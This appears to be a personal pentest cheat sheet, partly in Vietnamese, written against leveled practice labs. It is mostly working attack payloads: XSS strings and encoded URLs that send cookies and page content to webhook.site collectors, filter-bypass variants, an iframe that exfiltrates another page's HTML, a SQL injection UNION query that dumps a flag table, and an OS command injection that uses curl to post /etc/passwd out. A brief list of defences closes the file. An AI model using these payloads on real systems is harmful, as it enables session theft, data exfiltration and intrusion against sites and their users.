@@ -1,0 +1,58 @@
+.html .svg .swf  FILE exec js
+https://tsublogs.wordpress.com/2017/04/26/pentest-qa-cung-tsu-3-xss-upload-style/
+<h1>kaka</h1>
+alert(origin);
+
+script<script>fetch('https://webhook.site/fa3e73c6-2eb7-4297-9907-eda3b9dcdebb/'+fetch(https://note4.cyberjutsu-lab.tech/note).then(function (response) {return response.text())</script>
+script<script>alert(fetch(https%253a//note4.cyberjutsu-lab.tech/note).then(function%2b(response)%2b{return%2bresponse.text()})</script>
+level 1:https://note1.cyberjutsu-lab.tech/search?q=%3Cscript%3Efetch(%27https%3a//webhook.site/3149f4c4-1102-4400-b415-a79c61400641/%27%2bdocument.cookie)%3C/script%3E
+level 2:https://note2.cyberjutsu-lab.tech/search?q=%3Cscri%3Cscript%3Ept%3Efetch(%27https%3a//webhook.site/3149f4c4-1102-4400-b415-a79c61400641/%27%2bdocument.cookie)%3C/scr%3Cscript%3Eipt%3E
+level 3:
+<script>
+<img src=1 onerror="fetch('https://webhook.site/b43acf3e-ccdd-4eb1-9bc8-ad049fdba717/'+document.cookie)"></img>
+<img+src%3d1+onerror%3d"fetch('https://webhook.site/3f2f695d-152c-44ff-9368-54b7f0c4ed70/'%2bdocument.cookie)"></img>
+<img+src=1+on......="alert(1)"></img>
+<script nonce="404">alert(1);</script>
+script<script>alert(1)</script>
+
+level 4: ---------------------------------------------httpOnly:True
+fetch('https://note4.cyberjutsu-lab.tech/note').then(function (response) {return response.text()}).then(function (string) {fetch('https://webhook.site/fa3e73c6-2eb7-4297-9907-eda3b9dcdebb',{method: 'POST',body:string});});
+encode before using
+https://note4.cyberjutsu-lab.tech/search?q=script%3Cscript%3Efetch%28%27https%3A%2F%2Fnote4.cyberjutsu-lab.tech%2Fnote%27%29.then%28function+%28response%29+%7Breturn+response.text%28%29%7D%29.then%28function+%28string%29+%7Bfetch%28%27https%3A%2F%2Fwebhook.site%2Ffa3e73c6-2eb7-4297-9907-eda3b9dcdebb%27%2C%7Bmethod%3A+%27POST%27%2Cbody%3Astring%7D%29%3B%7D%29%3B%3C%2Fscript%3E
+-------------------------------------------------------location.search
+level 5: redirect  --> javascript:......
+<a href="javascrip%09t:alert(1)">ok
+script<script>window.location="https://serializededitor.com/"</script>
+
+level 6: https://ejs.co/
+<%-
+<%=
+
+"><svg onload=alert(1)>
+-------------------------------innerHTML
+<iframe id=1 src="https://koinbase-ff27148a4.cyberjutsu-lab.tech/api/user.php?action=detail_info" onload=window.location="https://webhook.site/126c94e9-2c39-4f20-8732-b6955b5cd1cb/".concat(document.getElementById(1).contentDocument.body.innerHTML)></iframe>
+-------------------------------------------------------unstrust data is in a values;
+<script>var a=''-alert(1)-'';</script>
+someString"-alert(1)-"someString
+--------------------------------------------------------special tag
+<component name="EYANGOTZ"> </component>       #controls and other basic HTML elements
+
+<noscript><p title='</noscript><img src="a" onerror="alert(origin)">'>
+<style><p title='</style><img src="a" onerror="alert(1)">'>
+
+XSS payload bypass: http://localhost:8403/search.php?content=%3Ca+href%3D%22javascript%3Aconsole.log%28origin%29%22%22%3Eclick-va-view-o-tab-console%3C%2Fa%3E
+- Real search: <a href="javascript:console.log(origin)">click-va-view-o-tab-console</a>
+
+SQL payload bypass: http://localhost:8403/search.php?content=%22%25%27+union+select+1%2C1%2C%28select+*+from+flag_ahihi%29+union+SELECT+id%2Ctitle%2Ccontent+FROM+news+WHERE+content+LIKE+%27%25a
+- Real search: "%' union select 1,1,(select * from flag_ahihi) union SELECT id,title,content FROM news WHERE content LIKE '%a
+
+OS payload bypass: http://localhost:8403/search.php?content=%60cu%5c%0arl%20--data-binary%20%22@/et%5c%0ac/pas%5c%0aswd%22%20HTTPS://webhook.site/7264d41d-6fd0-4064-bcee-3f486400a2a3%60
+---------------------------------------------------prevent
+xử dụng cơ chế nonce
+set httponly
+https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+---------------------csrf prevent
+set samesite=strict --prevent csrf
+or samesite=lax -- to get cookie from another web which you created
+csrf_token
+https://duthanhduoc.com/blog/p2-giai-ngo-authentication-session
